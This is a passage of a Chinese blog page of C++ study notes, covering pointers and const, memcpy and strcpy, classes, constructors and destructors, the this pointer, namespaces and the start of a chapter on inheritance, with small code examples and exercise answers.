&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
main函数首先定义了头节点指针：<code>student *head</code>;并申请动态内存，再存储几个学生的信息，会组成如下图的链表</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230208190629572.png" /></p>
<h2 id="void类型的指针">void类型的指针</h2>
<p>​ void类型指针声明：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *&lt;指针名&gt;;</span><br></pre></td></tr></table></figure>
<p>​ void类型指针也指向内存地址，但是不指定这个地址单元内的数据类型。</p>
<p>​ void类型指针有如下特点：</p>
<ul>
<li>任何其他类型的指针都可以赋值给void指针。但是这样赋值后的void的指针类型仍然是void；</li>
<li>void类型指针不可以直接赋值给任何其他类型的指针；</li>
<li>无论何时，void类型的指针都不能通过间接引用来访问内存中的数据，因为只要是数据就有类型，不存在“无类型”的数据</li>
<li>要通过void类型指针访问内存中的数据，必须进行指针类型的强制转换。</li>
</ul>
<p>​
void类型一般不会独立使用，而是作为指针类型转换的中介：将某种类型的指针转换为void指针，进行具体操作后，再转换回原来的类型。</p>
<p>​
C++有一个通用的内存区域的复制函数<strong>memcpy()</strong>，它就是将某种数据类型的地址转换void指针，进行复制后再强制转换为原来的类型地址类型。该函数的原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memcpy</span><span class="params">(<span class="type">void</span> *dest,<span class="type">const</span> <span class="type">void</span> *src,<span class="type">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure>
<p>​
函数有3个形参：源地址指针、目的地址指针、复制字节数。两个指针都是void类型，所以可以接受任何类型的实参指针。函数返回值是void类型目的地址指针，可以赋值给任何类型的指针。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> src[<span class="number">10</span>]=<span class="string">&quot;012345678&quot;</span>;</span><br><span class="line"><span class="type">char</span> dest[<span class="number">10</span>];</span><br><span class="line"><span class="type">char</span>* pc=(<span class="type">char</span>*)<span class="built_in">memcpy</span>(dest,src,<span class="number">10</span>);</span><br></pre></td></tr></table></figure>
<p>​
void类型指针还可以显示字符指针的内容。除了字符指针以外，指针都可以直接用cout输出地址值，但是用cout输出字符指针时，则是输出它所指向的字符串。可以将字符指针强制转换为void指针，再用cout输出。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *pch=<span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">cout&lt;&lt;pch&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;(<span class="type">void</span>*)pch&lt;&lt;endl;</span><br></pre></td></tr></table></figure>
<h2 id="内存泄漏和指针悬挂">内存泄漏和指针悬挂</h2>
<p>​ 内存泄漏：动态申请的内存空间没有正常释放，但是也不能继续使用</p>
<p>​ 指针悬挂：让指针指向一个已经释放了的空间</p>
<h2 id="关于const">关于const</h2>
<p>​
<strong>const默认作用于其左边的东西，如果左边没东西，则作用于其右边的东西。</strong></p>
<p>​ <strong>const int</strong>*</p>
<p>​ const
要作用于左边的东西，但是左边没东西，所以const修饰int成<strong>常量整型，</strong>然后*再作用于<strong>常量整型。</strong>所以这是<strong>a
pointer to a constant
integer</strong>（指向一个整型，不可通过该指针改变其指向的内容，但可改变指针本身所指向的地址）即<strong>常指针</strong></p>
<p>​ <strong>int* const</strong></p>
<p>​
这个const的左边是*，所以const作用于指针（不可改变指向的地址），所以这是<strong>a
constant pointer to an
integer</strong>，可以通过指针改变其所指向的内容但只能指向该地址，不可指向别的地址。即指针常量</p>
<p>​ <strong>const int* const</strong></p>
<p>​ 这里有两个const。左边的const
的左边没东西，右边有int那么此const修饰int。右边的const作用于*使得指针本身变成const（不可改变指向地址），那么这个是<strong>a
constant pointer to a constant
integer</strong>，不可改变指针本身所指向的地址也不可通过指针改变其指向的内容。</p>
<p>​ <strong>int const * const</strong></p>
<p>​
这里也出现了两个const，左边都有东西，那么左边的const作用于int，右边的const作用于*，于是这个还是<strong>a
constant pointer to a constant integer</strong>。</p>
<h2 id="小结">小结</h2>
<p>​ 指针的特点是可变性，即指针内的地址是可变的。</p>
<p>​ 引用的特点是不变性，一个变量的引用只能和这个变量联系在一起。</p>
<h2 id="题目-1">题目</h2>
<p><strong>以下程序在使用指针时有没有问题？运行后是否有问题？</strong>此题存疑</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *pch;</span><br><span class="line">    pch=<span class="keyword">new</span> <span class="type">char</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(pch,<span class="string">&quot;Book&quot;</span>);</span><br><span class="line">    cout&lt;&lt;pch&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">delete</span> pch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序在编译时没有错误。但是，存在内存泄漏问题，申请的堆内存没有释放，运行时也会出现错误。因为delete语句要释放的不是堆内存的地址；pch中现在是字符串地址，这样的地址不需要通过delete释放，也不可以通过delete释放。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230209213603588.png" /></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> *pa, <span class="type">int</span> n, <span class="type">int</span> *pmin, <span class="type">int</span> *pflag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *pmin = *pa;</span><br><span class="line">    *pflag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pa[i] &lt; *pmin)</span><br><span class="line">        &#123;</span><br><span class="line">            *pmin = *(pa + i);</span><br><span class="line">            *pflag = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>&#125;, min, ind;</span><br><span class="line">    <span class="built_in">search</span>(a, <span class="number">10</span>, &amp;min, &amp;ind);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;The min element is:&quot;</span> &lt;&lt; min &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Its num is:&quot;</span> &lt;&lt; ind;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2
id="有点意思的字符串与指针与字符数组">有点意思的字符串与指针与字符数组</h2>
<p>​
字符指针：指向字符型数据的指针变量。每个字符串在内存中都占用一段连续的存储空间，并有唯一确定的首地址。将字符串的首地址赋给字符指针，可让字符指针指向一个字符串</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *ptr = <span class="string">&quot;Hello&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>​ 字符数组：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">10</span>]=<span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *ptr=str;<span class="comment">//等价于</span></span><br><span class="line"><span class="type">char</span> *ptr;</span><br><span class="line">ptr=str;</span><br></pre></td></tr></table></figure>
<p>​ 函数strcpy:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">my_strcpy</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src)</span> <span class="comment">//把src所指向的字符串复制到dest中</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span>* ret = dest;<span class="comment">//存入地址方便返回dest原始地址</span></span><br><span class="line">	<span class="built_in">assert</span>(dest &amp;&amp; src);<span class="comment">//断言，防止传入空指针</span></span><br><span class="line">	<span class="keyword">while</span> (*dest++ = *src++) <span class="comment">//先++后赋值；因为是后置++；所以赋值后在执行自增操作</span></span><br><span class="line">	&#123;</span><br><span class="line">		;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;<span class="comment">//返回地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传入两个数组指针dest，src，返回指针指向dest首地址</p>
<p>定义ret指针存入dest地址
assert（断言），需引入头文件,对不符合要求的传参发出警告 <strong>while
(dest++ = src++)</strong>
代码执行，src指针++，因为是后置++，先赋值后++，src首地址所指向的第一个数据传入dest中的首地址中，修改值,while判断（）中值为真，即不为0；循环继续
src++ dest++ 两个指针后移，依次进行上续操作，直至src指向 ‘\0’
src为’\0’,先赋值给dest，++后，while判断，‘\0’,值为假，跳出循环
返回dest首地址</p>
<h1 id="第七章类与对象">第七章：类与对象</h1>
<h2 id="类和对象的定义">类和对象的定义</h2>
<h3 id="基本概念">基本概念</h3>
<p>​ 类代表一类事物，事物具有相应的特征和属性。</p>
<p>​ 类有数据成员和成员函数。</p>
<p>​
类是一种用户自定义的数据类型，与结构体类似，但类的成员是默认private的，不可以任意访问。</p>
<p>​ 类和对象具有继承和多态的特性。</p>
<h3 id="类的声明">类的声明</h3>
<p>​ 类是一组对象的抽象化模型。</p>
<p>​ 声明类的语法形式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> 类名称</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		私有成员;</span><br><span class="line">	<span class="keyword">protected</span>:</span><br><span class="line">		保护型成员;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		公有成员;</span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure>
<p>​ 成员既可以是数据成员，也可以是成员函数的原型。</p>
<p>​ 类的成员包括数据成员和函数成员，分别描述问题的属性和操作。</p>
<p>​
数据成员的声明和一般变量相同，函数成员用于描述类的对象可以进行的操作，一般在类中声明原型，在类声明之后定义函数的具体实现。</p>
<p>​ 根据访问权限不同，类成员可以分为3类：</p>
<ul>
<li>私有成员：只允许本类的成员函数来访问；</li>
<li>公有成员：类对外的窗口，允许外界访问；</li>
<li>保护型成员：可访问性与私有成员性质类似，差别在于继承过程中对派生类的影响不同；</li>
</ul>
<p>​ 默认的访问属性是private。</p>
<h3 id="类的实现">类的实现</h3>
<p>​
类的成员函数描述的是类的行为或操作。函数的原型声明要在类的主体中，而函数的具体实现一般写在类声明之外。</p>
<p>​ 定义成员函数的语法形式如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">返回值类型 类名::成员函数名(参数表)</span><br><span class="line">&#123;</span><br><span class="line">    函数体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 通过类名和作用域操作符"::"来表示函数属于哪个类。</p>
<p>​ 类的成员函数还可以有多种形态：</p>
<ul>
<li><p>带默认参数值的成员函数，默认值要写在函数原型声明中，调用规则与普通函数相同；</p></li>
<li><p>内联成员函数：</p>
<ul>
<li><p>声明方式：<strong>隐式声明和显式声明</strong></p></li>
<li><p>隐式声明：在类声明时定义的成员函数都是<strong>内联函数</strong>。函数定义时没有任何的附加说明，所以称为隐式声明。</p></li>
<li><p>显式声明：在类声明之后定义内联函数需要用关键词inline</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">inline</span> 返回值类型 类名::成员函数名(参数表)&#123;函数体&#125;</span><br></pre></td></tr></table></figure></li>
</ul></li>
<li><p>成员函数的重载</p>
<p>成员函数可以像普通函数那样重载。类名也是成员函数名的一部分，所以一个类的成员函数即使与另一个类的成员函数同名，也不能认为是重载。</p></li>
</ul>
<h3 id="对象的定义和使用">对象的定义和使用</h3>
<p>​ 语法形式：类名称 对象名称;</p>
<p>​
一个对象所占空间是类的数据成员所占的空间总和。类的成员函数存放在代码区，不占用栈和堆空间。</p>
<p>​ <strong>类的成员是抽象的，对象的成员才是具体的。</strong></p>
<p>​
类声明中的数据成员一定不能具有具体的属性值，只有对象的成员才具有具体的属性值。</p>
<p>​ 数据成员的访问语法形式：<strong>对象名.公有数据成员</strong></p>
<p>​
如果是函数成员，其一般形式为：<strong>对象名.公有成员函数名(参数表)</strong></p>
<h3 id="类的作用域与可见性">类的作用域与可见性</h3>
<h4 id="类的作用域">类的作用域</h4>
<p>​
一个类的所有成员位于这个类的作用域内，一个类的所有成员函数都能访问这个类的所有成员，C++认为一个类的全部成员是一个整体的相关部分。</p>
<p>​
类作用域是指<strong>类定义和相应的成员定义的范围</strong>，通俗地称为类的内部。在该范围内，一个类的成员函数对本类的其他成员具有<strong>无限制</strong>的访问权。</p>
<h4 id="类的可见性">类的可见性</h4>
<p>​
类名实际上是个类型名，允许<strong>类与其他类型变量或其他函数</strong>同名。</p>
<p>​
在类的内部，与<strong>类或类的成员同名</strong>的全局变量名或函数名不可见。</p>
<p>​
在一个函数内，同名的类和变量可以<strong>同时使用</strong>，都是可见的。</p>
<h2 id="构造函数">构造函数</h2>
<p>​
类和对象的关系是简单数据类型与其变量的关系，也就是一般与特殊的关系。</p>
<p>​
C++中对象的初始化由<strong>构造函数</strong>完成，清理由<strong>析构函数</strong>完成。</p>
<p>​ <strong>析构的顺序与构造的顺序相反。</strong></p>
<h3 id="构造函数的定义">构造函数的定义</h3>
<p>​ 定义构造函数的一般形式为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> 类名</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		类名(形参表);<span class="comment">//构造函数原型</span></span><br><span class="line">	<span class="comment">//类的其它成员</span></span><br><span class="line">&#125;;</span><br><span class="line">类名::类名(形参表)<span class="comment">//构造函数的实现</span></span><br><span class="line">&#123;</span><br><span class="line">	函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 构造函数可以在类的内部实现，也可以在外部实现。</p>
<p>​
构造函数的特点：<strong>构造函数的名称和类名相同，构造函数没有返回值，构造函数一定是公有函数。</strong></p>
<p>​ 构造函数可以带默认形参值，也可以重载。</p>
<h3 id="构造函数的重载">构造函数的重载</h3>
<p>​ 构造函数可以像普通函数那样重载，根据需要选用。</p>
<h3 id="带默认值的构造函数">带默认值的构造函数</h3>
<p>​ 同普通函数相同。</p>
<h3 id="默认构造函数和无参构造函数">默认构造函数和无参构造函数</h3>
<p>​
没有定义类的构造函数时，编译器会在编译时自动生成一个默认形式的构造函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">类名::类名()&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>​ 一个既没有形参，也没有任何语句的函数。</p>
<p>​ 只有在类中没有定义任何构造函数的情况下，才能使用默认构造函数。</p>
<p>​ 无参构造函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">类名::类名()&#123;语句&#125;</span><br></pre></td></tr></table></figure>
<p>​
<strong>程序中不能同时出现无参数构造函数和带有全部默认参数的构造函数</strong>，否则会出现编译错误。</p>
<h3 id="复制构造函数">复制构造函数</h3>
<p>​ 用来复制一个对象。</p>
<p>​
<strong>复制构造函数就是函数形参是类的对象的引用的构造函数。</strong></p>
<p>​ 定义一个复制构造函数的一般形式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> 类名</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		类名(类名&amp; 对象名);<span class="comment">//复制构造函数原型</span></span><br><span class="line">&#125;;</span><br><span class="line">类名::类名(类名&amp; 对象名)<span class="comment">//复制构造函数的实现</span></span><br><span class="line">&#123;</span><br><span class="line">	函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">complex</span>(<span class="type">const</span> complex &amp; c)<span class="comment">//自己定义了一个复制构造函数 </span></span><br><span class="line">	  &#123;</span><br><span class="line">	  	real=c.real;</span><br><span class="line">	  	imag=c.imag;</span><br><span class="line">	  	cout&lt;&lt;<span class="string">&quot;复制构造函数&quot;</span>; </span><br><span class="line">	   &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​
复制构造函数是一种特殊的构造函数，具有一般构造函数的所有特性，其形参是<strong>本类对象的引用</strong>，其作用是使用一个已经存在的对象去初始化一个新的同类的对象。</p>
<p>​
复制构造函数和原来的构造函数实现了<strong>函数的重载</strong>，如果程序没有显式定义复制构造函数，系统也会默认生成一个，将成员值一一复制。</p>
<p>​
但某些情况必须显式定义一个复制构造函数。例如，当类的成员包括指针变量时，类的构造函数用new运算符为这个指针动态申请空间，如果复制时只是简单的一一复制，就会出现两个对象指向相同的堆地址，程序就会报错，这时候就必须定义复制构造函数，在其中为新对象申请新的堆空间。</p>
<h2 id="析构函数">析构函数</h2>
<p>​ 对象所占用的空间要通过析构函数来释放，函数原型是：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">~类名()；</span><br></pre></td></tr></table></figure>
<p>​ 如果程序不定义析构函数，系统也会提供一个默认的析构函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">~类名()&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>​ 这个析构函数不能释放堆空间。</p>
<p>​
析构函数也是类的一个公有成员函数，没有返回值，<strong>没有形式参数</strong>。</p>
<p>​
析构函数在<strong>对象生存期即将结束</strong>的时刻由系统自动调用的。</p>
<p>​ <strong>类的析构函数不能重载</strong>，因为析构函数没有参数。</p>
<h2 id="面向对象设计">面向对象设计</h2>
<h3 id="类的封装性">类的封装性</h3>
<p>​ 将<strong>数据和操作数据的行为</strong>进行有机结合就是封装性。</p>
<p>​
类是<strong>属性和操作的结合体</strong>，并在定义类的属性和操作时，规定了它们的可见性。</p>
<p>​ 封装有两个含义：</p>
<ol type="1">
<li><strong>包装</strong>，将对象的全部属性和操作结合在一起</li>
<li><strong>信息隐藏</strong></li>
</ol>
<p>​
封装性是面向对象的重要原则。对象的属性和操作的紧密结合反映了事物的静态特征和动态特征，封装的信息隐藏能力反映了事物的相对独立性。</p>
<h3 id="软件工程">软件工程</h3>
<p>​ 可靠性，成本效益好，可理解性，可维护性。</p>
<p>​
面向对象首先是一种思想，面向对象程序设计是面向对象思想在软件工程领域的全面应用。</p>
<h3 id="面向对象的意义">面向对象的意义</h3>
<ol type="1">
<li>模块化</li>
<li>软件复用</li>
</ol>
<h2 id="对象数组">对象数组</h2>
<p>​ 数组的元素可以是自定义的类类型。</p>
<p>​
对象数组的元素是对象，不仅具有数据成员，还有函数成员，可以通过数组元素调用成员函数。</p>
<p>​ 析构的顺序与构造的顺序相反。</p>
<h2 id="使用对象传递函数参数">使用对象传递函数参数</h2>
<p>​ 类类型可以作为函数的一个参数类型和返回值类型。</p>
<p>​
如果类的数据成员较多，需要一一复制，这时候用对象指针或对象引用的方式来传递函数参数。</p>
<h2 id="对象指针和堆对象">对象指针和堆对象</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Clock c;<span class="comment">//在栈中分配Clock型存储空间空间</span></span><br><span class="line">Clock *pc1=<span class="keyword">new</span> Clock;<span class="comment">//在堆中分配Clock型存储空间空间</span></span><br><span class="line">Clock *pc2=&amp;c;</span><br></pre></td></tr></table></figure>
<p>​
对象指针就是用于<strong>存放对象地址的变量</strong>，可以用new在堆中给对象分配存储空间，也可以使用一个已有对象初始化对象指针。</p>
<p>​ 对象指针遵循一般变量指针的规则，声明对象指针的一般语法形式为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">类名 *对象指针名;</span><br></pre></td></tr></table></figure>
<p>​
使用对象指针访问对象的成员，要使用“<strong>-&gt;</strong>”运算符，语法形式为：<strong>对象指针名-&gt;公有成员;</strong></p>
<h2 id="this指针">this指针</h2>
<p>​ <strong>在类的外部访问类的成员必须通过对象来调用。</strong></p>
<p>​ 成员函数是如何识别不同变量属于哪个对象呢？</p>
<p>​
对象在调用成员函数时，还接收了一个地址参数，这个参数的数据类型是<strong>类名</strong>*，形式参数的名称为this，因此成员函数的原型实际上是：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">类型名 函数名(类名 *<span class="keyword">this</span>,形参<span class="number">1</span>,形参<span class="number">2.</span>..)</span><br></pre></td></tr></table></figure>
<p>​
当调用时，系统会自动<strong>取对象的地址</strong>作为实际参数赋给this指针。</p>
<p>​ 需要时可以显式地使用this指针。</p>
<p>​
在成员函数内部，所有对类成员的访问都可以加上<strong>隐含的前缀this-&gt;</strong>。</p>
<p>​
<strong>this指针指出了成员函数当前所操作的数据所属的对象</strong>，不同的对象调用成员函数时，this指针将指向不同的对象，也就可以访问不同对象的数据成员。</p>
<p>​ 有时需要在成员函数中用*this来标识正在调用该函数的对象。</p>
<h2 id="复制析构函数">复制析构函数</h2>
<p>​
当构造时从堆中为对象的成员分配存储空间，在对象生存期结束时，把堆空间释放，归还给系统，需要定义一个复制构造函数。</p>
<h2 id="内部类和命名空间">内部类和命名空间</h2>
<p>​ 把一个类的定义写在另一个类的内部，称其为内部类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AAA</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="comment">//定义内部类</span></span><br><span class="line">		<span class="keyword">class</span> <span class="title class_">Inner</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">public</span>:</span><br><span class="line">				<span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
上面的代码将类Inner定义在AAA内部，此时内部类的类名全称为：AAA:Inner，使用时要用类全名：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	AAA:Inner a;</span><br><span class="line">	<span class="built_in">strcpy</span>(a.name,<span class="string">&quot;xulei&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
内部类在使用上和普通类<strong>几乎没有区别</strong>，外部类AAA不能自由访问内部类的成员，内部类Inner也不能自由访问外部类的成员，<strong>相当于把Inner写在外面</strong>。</p>
<p>​
内部类的用途主要是为了<strong>避免类名的冲突</strong>。当发现一个类仅在局部使用时，就可以定义一个内部类。</p>
<p>​ 命名空间是解决名字冲突的终极方案，语法格式为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> ID</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
可以把很多的名字：类名、函数名、全局变量名，定义在一个命名空间ID里，以后使用ID作为前缀，ID要在<strong>整个项目</strong>里<strong>全局唯一</strong>。</p>
<p>​
在main函数中使用命名空间里的名字时，需要<strong>加上前缀</strong>，如果确定不会有名字冲突，可以使用<strong>using</strong>语句来解除前缀。</p>
<h2 id="题目-2">题目</h2>
<p><strong>类和对象的区别是什么？</strong>
一个类表示现实生活中的一类事物，是抽象的，对象是一类事物中的一个具体的个体，即对象是类的一个具体的实例，类和对象的关系相当于普遍与特殊的关系。在C++中，类是一个自定义的数据类型，对象是该数据类型的一个变量。</p>
<p><strong>什么时候系统会调用复制构造函数？</strong>
复制构造函数在以下三种情况下都会被调用:
1.用类的一个对象去初始化该类的另外一个对象
2.如果函数的形参是类的对象，调用函数时，进行形参和实参结合时
3.如果函数的返回值是类的对象，函数执行完成返回调用者时</p>
<h1 id="第八章继承">第八章：继承</h1>
<h2 id="继承的概念">继承的概念</h2>
<p>​
继承是在现有的类的基础上创建新类，并<strong>扩展</strong>现有类的功能的机制，称现有的类为<strong>基类(Base
Class)</strong>，新建立的类为<strong>派生类(Derived
Class)</strong>。</p>
<p>​
“派生”可以理解为继承的另外一种说法。类D继承了类B可以表述为类B派生出类D。若类B派生出类D1、D2...，可以说B是D1、D2...的繁华，称B为D1、D2...的基类，称D1、D2为B的派生类。</p>
<p>​ <strong>“基类-派生类”=“父类(Parent Class)-子类(Child
Class)”=“超类(Superclass)-子类(Subclass)”</strong></p>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230209113316738.png" /></p>
<p>​
泛化是一个从<strong>特殊到一般</strong>的总结过程，将子类的共同特征抽象出来，得到父类。</p>
<p>​
若派生类<strong>只有一个直接基类</strong>，则称这种继承方式为<strong>单继承</strong>；若派生类有<strong>多个直接基类</strong>，则称为多继承。</p>
<p>​
如非必要，不推荐使用多继承，多继承的问题可以使用类的组合的方法来代替。</p>
<h2 id="基类和派生类">基类和派生类</h2>
<p>​
如何从基类得到派生类。基类的成员会被继承到派生类中，但是这些成员在派生类的访问控制属性受到继承方式的影响，同时继承还会导致<strong>同名覆盖</strong>。</p>
<ul>
<li>派生类继承了基类的所有成员，派生类对象包括基类的数据成员，也可以直接调用基类公有函数；</li>
<li>派生类对象不可以直接访问基类的私有成员；</li>
<li>派生类对象可以通过基类的公有函数访问基类的私有成员；</li>
</ul>
<h3 id="定义派生类">定义派生类</h3>
<p>​ 语法格式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> 派生类名: 继承方式 基类<span class="number">1</span>,继承方式 基类<span class="number">2</span>,...,继承方式,基类n&#123;</span><br><span class="line">    	派生类成员声明;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>​ 如果仅有一个基类，那么就是单继承，否则是多继承。</p>
<p>​
继承方式是<strong>public、private和protected</strong>三者之一，不同的继承方式会影响<strong>基类成员</strong>在<strong>派生类</strong>的访问控制属性。</p>
<p>​
派生类继承了基类的所有成员，但<strong>不包括构造函数、析构函数和默认赋值运算符。</strong></p>
<h3 id="继承方式和访问控制">继承方式和访问控制</h3>
<h4 id="protected属性">protected属性</h4>
<p>​
派生类希望访问基类的一些成员，但仍然禁止用户代码访问这些成员，此时，需要将基类成员设置为protected访问方式。</p>
<p>​
类的对象不能访问protected属性的成员，但是派生类的成员函数可以访问基类的protected属性的成员。</p>
<ul>
<li>protected成员不能通过本类对象访问(在类的外部)；</li>
<li>protected成员可以被派生类成员函数访问(在派生类内部)；</li>
<li>protected成员不能通过派生类对象访问(在类的外部)；</li>
</ul>
<h4 id="继承方式影响访问控制">继承方式影响访问控制</h4>
<ol type="1">
<li><p>派生类的成员函数对所继承的基类成员的访问控制</p>
<p>派生类成员函数都可以访问基类的public和protected成员，但不能访问基类的private成员</p></li>
<li><p>派生类对象对所继承的基类成员的访问控制</p>
<p>只有public继承的派生类对象可以访问基类的public成员，protected和private继承的派生类对象不能访问基类public成员</p></li>
<li><p>基类成员的访问属性在派生类中的变化</p>
<ul>
<li>对于<strong>public继承</strong>，基类的public成员、protected成员在派生类中仍然<strong>保持</strong>原来的访问属性；</li>
<li>对于<strong>protected继承</strong>，基类的public成员和protected成员在派生类中变为<strong>protected属性</strong>；</li>
<li>对于<strong>private继承</strong>，基类的public成员、protected成员在派生类中<strong>都变为private属性</strong>；</li>
<li>不论是哪种继承方式，基类的private成员在派生类中都不可被访问；</li>
</ul></li>
</ol>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230209123159944.png" /></p>
<p>​
private继承看似好像不影响派生类成员对基类public和protected成员的访问。但如果有连续两次的private继承，基类的public和protected成员在最下面一层的派生类中都将不能访问。</p>
<h2 id="同名覆盖">同名覆盖</h2>
<p>​
同名覆盖：派生类修改基类的成员，是在派生类中<strong>声明了一个与基类成员同名的新成员</strong>。在<strong>派生类作用域内或者在类外通过派生类的对象直接使用</strong>这个成员名，只能访问到派生类中声明的同名新成员，这个新成员覆盖了从基类继承的新成员。</p>
<h2 id="派生类的构造和析构">派生类的构造和析构</h2>
<p>​
派生类需要定义自己的构造函数和析构函数。派生类的构造和析构函数会受到基类构造和析构函数的影响。</p>
<h3 id="基类只有无参构造函数">基类只有无参构造函数</h3>
<p>​
基类具有无参构造函数，派生类又没有定义自己的构造函数，系统会<strong>自动调用基类的无参构造函数来</strong>构造派生类对象中的<strong>基类成分</strong>。</p>
<p>​
基类没有无参构造函数，派生类也不定义自己的构造函数，便会发生语法错误。</p>
<p>​ 基类的构造函数一般被声明为<strong>public</strong>访问控制方式。</p>
<h3 id="派生类构造函数">派生类构造函数</h3>
<p>​
一般来说，派生类构造函数要<strong>初始化本类的数据成员</strong>，还要<strong>调用基类的构造函数</strong>，<strong>并为基类构造函数传递参数</strong>，完成派生类中<strong>基类成分的初始化</strong>。</p>
<p>​ 派生类构造函数的形式如下：</p>
